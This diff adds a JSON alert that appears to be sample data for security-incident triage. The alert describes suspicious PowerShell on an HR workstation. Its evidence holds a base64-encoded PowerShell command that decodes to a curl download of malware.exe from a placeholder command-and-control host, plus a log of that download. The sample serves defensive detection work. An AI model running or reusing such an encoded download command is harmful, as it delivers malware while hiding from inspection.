@@ -1,0 +1,17 @@
+{
+  "title": "PowerShell Remote Execution - HR Dept",
+  "description": "Suspicious encoded PowerShell command executed in HR department computer.",
+  "severity": "High",
+  "evidence": [
+    {
+      "source": "Sysmon Event 1",
+      "content": "Process creation: powershell.exe -EncodedCommand IAAgAGMAdQByAGwAIAAtAHMAIABoAHQAdABwADoALwAvAGMAMgAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIAAtAG8AIABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIA== user=admin T1059",
+      "content_type": "log"
+    },
+    {
+      "source": "Network Capture",
+      "content": "Connection from 192.168.1.55 to c2-server.com:80. Downloaded malware.exe",
+      "content_type": "network"
+    }
+  ]
+}
